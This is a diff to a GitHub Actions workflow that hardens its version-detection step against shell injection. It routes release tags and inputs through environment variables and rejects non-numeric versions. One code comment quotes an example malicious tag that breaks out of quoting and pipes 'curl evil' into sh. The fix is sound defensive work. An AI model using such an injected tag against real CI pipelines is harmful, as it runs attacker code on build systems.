@@ -28,13 +28,26 @@ jobs:
 
       - name: Work out which release we are packaging
         id: v
+        # The tag and the dispatch input are attacker-influenceable text, so they
+        # go through the environment rather than being interpolated straight into
+        # the shell - `${{ }}` substitution happens BEFORE the shell parses the
+        # line, so a tag like `1.5.1"; curl evil | sh #` would otherwise execute.
+        # Reading $EVENT/$TAG/$INPUT as shell variables makes them inert data.
+        env:
+          EVENT: ${{ github.event_name }}
+          TAG: ${{ github.event.release.tag_name }}
+          INPUT: ${{ inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            V="${{ github.event.release.tag_name }}"
-            V="${V#v}"
+          if [ "$EVENT" = "release" ]; then
+            V="${TAG#v}"
           else
-            V="${{ inputs.version }}"
+            V="$INPUT"
           fi
+          # Refuse anything that is not a plain version, so a malformed value
+          # cannot travel downstream into the unquoted docker run steps.
+          case "$V" in
+            *[!0-9.]*|"") echo "refusing suspicious version: '$V'" >&2; exit 1 ;;
+          esac
           echo "version=$V" >> "$GITHUB_OUTPUT"
           echo "packaging $V"
 
